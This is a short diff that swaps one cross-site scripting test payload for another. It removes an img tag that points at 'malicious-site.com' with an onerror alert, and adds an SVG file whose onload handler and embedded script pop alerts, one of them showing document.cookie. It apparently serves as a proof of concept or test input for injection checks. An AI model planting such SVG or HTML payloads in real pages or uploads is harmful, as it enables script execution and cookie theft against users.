@@ -1,1 +1,5 @@
-<img src="https://malicious-site.com/payload.png" onerror="alert('HTML Injection Works!')">
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert('SVG Payload Executed!')">
+  <script><![CDATA[
+    alert(document.cookie);
+  ]]></script>
+</svg>
